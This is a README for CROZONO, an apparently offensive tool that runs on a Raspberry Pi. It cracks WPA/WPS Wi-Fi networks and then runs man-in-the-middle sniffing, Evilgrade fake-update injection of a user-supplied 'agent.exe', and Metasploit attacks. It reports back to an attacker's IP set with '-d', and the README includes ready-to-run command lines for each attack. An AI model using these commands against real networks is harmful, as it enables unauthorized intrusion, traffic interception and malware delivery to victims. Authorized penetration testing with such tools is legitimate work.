# Usage
CROZONO has been developed to run in Raspberry Pi. Use Raspbian or Kali Linux (for Raspberry) as operating system.

# Requirements and set up
- Python 3
- Python requirements: `pip install -r requirements.txt`

(The following must be present in your PATH)
- Aircrack-ng
- Reaver
- PixieWPS
- Nmap
- Ettercap
- Tshark
- Evilgrade
- Metasploit

Using Kali is recommended as all of the above binaries are installed and ready to use.


# Evilgrade & Dictionaries
To use Evilgrade, put your agent in "evilgrade" folder and rename it to "agent.exe".

To use a dictionary to attack to WPA/2 secured networks, put your dictionary in CROZONO's folder and rename it to "dic"


# Parameters
- To attack an specific network, put the essid with "-e" parameter:
	- e.g.: `crozono.py -e <essid>`
- If you have the password of access point, set it with the "-k" parameter:
	- e.g.: `crozono.py -e <essid> -k <password>`
- If you want CROZONO to open a connection to an attacker's IP, set the IP address using the "-d" parameter.
	- e.g.: `crozono.py -d 190.190.190.190`
- If you want that CROZONO perform a local network attack, put the attack to be used with "-a" parameter.
	- e.g.:
		- `crozono.py -d 190.190.190.190 -a sniffing-mitm`
		- `crozono.py -d 190.190.190.190 -a evilgrade`
		- `crozono.py -d 190.190.190.190 -a metasploit`

The free version of CROZONO only support three attacks: sniffing-mitm, evilgrade and metasploit.
The attacks provide information in real time to attacker, so you must use the parameter -a and -d together.

- Examples:
	- `crozono.py`
	- `crozono.py -e <essid>`
	- `crozono.py -e <essid> -k <key>`
	- `crozono.py -a metasploit -d 190.190.190.190`
	- `crozono.py -e <essid> -a sniffing-mitm -d 190.190.190.190`
	- `crozono.py -e <essid> -k <key> -a evilgrade -d 190.190.190.190`

